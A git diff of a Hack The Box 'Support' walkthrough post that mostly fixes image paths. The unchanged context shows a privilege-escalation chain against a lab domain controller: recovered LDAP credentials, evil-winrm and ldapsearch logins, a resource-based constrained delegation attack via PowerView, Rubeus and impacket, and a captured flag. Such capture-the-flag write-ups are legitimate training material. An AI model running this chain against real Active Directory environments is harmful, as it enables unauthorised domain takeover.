@@ -1,7 +1,7 @@
 ---
 title: "HTB - Support"
 categories: [box]
-date: 2022-11-01
+date: 2022-12-20
 comments: true
 image: /images/walkthroughs/hackthebox/support/logo.png
 favicon: /images/walkthroughs/hackthebox/support/logo.png
@@ -11,7 +11,7 @@ description: HTB - Support walkthrough
 # Support
 
 <p align="center">
-  <img src="/images/walkthroughs/hackthebox/support/banner.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/banner.png" width="70%"/>
 </p>
 
 
@@ -178,7 +178,7 @@ We can see that it is a .NET binary. I had no idea how to decompile this .exe, s
 With DNSpy, we check the decompiled code and saw the _UserInfo.Services_ namespace and within two objects: _LdapQuery_ and _Protected_. In the second one we can see an encripted password, the key and some decription algoritm:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/2_0_protected.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/2_0_protected.png" width="90%"/>
 </p>
 
 ```c#
@@ -214,7 +214,7 @@ namespace UserInfo.Services
 Furthermore, we can see the username it is using in the LdapQuery object (_support_):
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/2_1_protected.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/2_1_protected.png" width="90%"/>
 </p>
 
 
@@ -268,7 +268,7 @@ evil-winrm -i 10.129.227.255 -u support -p nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/3_1_nowinrm.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/3_1_nowinrm.png" width="90%"/>
 </p>
 
 So, let's keep enumerating the LDAP with the ldapsearch tool:
@@ -278,7 +278,7 @@ ldapsearch -x -H ldap://10.129.227.255 -D support\\ldap -w 'nvEfEK16^1aM4$e7AclU
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/4_0_ldap.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/4_0_ldap.png" width="90%"/>
 </p>
 
 With this command we get tons of information, so let's try to narrow the search, first to the users:
@@ -408,7 +408,7 @@ Info: Establishing connection to remote endpoint
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/5_0_user.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/5_0_user.png" width="90%"/>
 </p>
 
 And we got the user flag:
@@ -444,7 +444,7 @@ MachinePolicy       Undefined
 With bloodhound we can see that the user support@support.htb has _GenericAll_ over the Domain Controller, so we can read/write over computer objects in the DC. Also there is one **Group Delegated Object Control** which means that probably, we can execute a _Kerberos Resource-based Constrained Delegation_ by computer object takeover:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_0_blood.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_0_blood.png" width="90%"/>
 </p>
 
 
@@ -462,7 +462,7 @@ Here I drew the process, to see in a glance what it is happening:
 
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_0_kerb.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_0_kerb.png" width="90%"/>
 </p>
 
 
@@ -484,7 +484,7 @@ Get-DomainObject -Identity "dc=support,dc=htb" -Domain support.htb
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_1_quota.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_1_quota.png" width="70%"/>
 </p>
 
 We can see that the quota is ten, so requirement checked. Now, the attack also requires the DC to be running at least Windows 2012, so let's check if we're in the right environment:
@@ -514,7 +514,7 @@ Get-NetComputer DC | Select-Object -Property name, msds-allowedtoactonbehalfofot
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_3_msds-dc.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_3_msds-dc.png" width="70%"/>
 </p>
 
 We got nothing, so last requierement checked. Now, let's perform the attack.
@@ -532,7 +532,7 @@ Evil-WinRM* PS C:\Users\support\Desktop>
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_4_machine.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_4_machine.png" width="70%"/>
 </p>
 
 Check if the computer was created and take the SID:
@@ -568,7 +568,7 @@ Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofothe
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_5_bytes.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_5_bytes.png" width="90%"/>
 </p>
 
 We were able to write this because _SUPPORT@SUPPORT.HTB_ belongs to security group _SHARED SUPPORT ACCOUNTS@SUPPORT.HTB_, which has full control (GenericAll) over the target computer DC$.
@@ -584,7 +584,7 @@ msds-allowedtoactonbehalfofotheridentity
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_6_attr.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_6_attr.png" width="90%"/>
 </p>
 
 To make sure everything is set in place, let's check that the security descriptor from DC in attribute _msds-allowedtoactonbehalfofotheridentity_ refers to FAKE01$ machine (SID finished in 5601):
@@ -612,7 +612,7 @@ AuditFlags         : None
 We have SID _S-1-5-21-1677581083-3380853377-188903654-5601_ which is FAKE01$ SID. So we are good.
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_7_checks.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_7_checks.png" width="90%"/>
 </p>
 
 Now, perform the impersonation with Rubeus.exe First, generate the RC4 hash of the password we set for the FAKE01 computer:
@@ -647,7 +647,7 @@ Now, perform the impersonation with Rubeus.exe First, generate the RC4 hash of t
 We get the RC4_HMAC: **32ED87BDB5FDC5E9CBA88547376818D4**. Now, let's execute the attack, with Rubeus requesting a Kerberos Ticket for FAKE01$ with the capability of impersonating user ADMINISTRATOR@SUPPORT.HTB. Why this user? because this user is an Explicit Admin of target machine DC.SUPPORT.HTB as seen on BloodHound:
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_8_admins.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_8_admins.png" width="90%"/>
 </p>
 
 Execute the following command to get the ticket as ADMINISTRATOR:
@@ -658,7 +658,7 @@ Execute the following command to get the ticket as ADMINISTRATOR:
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_9_ticket.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_9_ticket.png" width="90%"/>
 </p>
 
 Even though we got the ticket, I did not impersonate the ADMINISTRATOR since I got permission denied trying to list C$ share in the DC:
@@ -668,7 +668,7 @@ Even though we got the ticket, I did not impersonate the ADMINISTRATOR since I g
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_10_rip.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_10_rip.png" width="90%"/>
 </p>
 
 
@@ -695,7 +695,7 @@ Cached Tickets: (1)
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_11_ticket.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_11_ticket.png" width="90%"/>
 </p>
 
 Tried many different configurations for Rubeus but didn't work at the end.
@@ -723,7 +723,7 @@ impacket-getST SUPPORT.HTB/FAKE01:123456 -dc-ip 10.129.227.255 -impersonate ADMI
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/6_12_impa.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/6_12_impa.png" width="90%"/>
 </p>
 
 Now export the ticket to current session and launch the attack. Make sure to have the DC.SUPPORT.HTB on the /etc/hosts:
@@ -734,11 +734,11 @@ impacket-wmiexec SUPPORT.HTB/ADMINISTRATOR@DC.SUPPORT.HTB -no-pass -k
 ```
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/7_0_admin.png" width="90%"/>
+  <img src="/images/walkthroughs/hackthebox/support/7_0_admin.png" width="90%"/>
 </p>
 
 <p align="center">
-  <img src="/images/walkthrougshs/hackthebox/support/7_1_root.png" width="70%"/>
+  <img src="/images/walkthroughs/hackthebox/support/7_1_root.png" width="70%"/>
 </p>
 
 ``` 1d00ed25fd6aad8a70fe85394fa4e506 ```
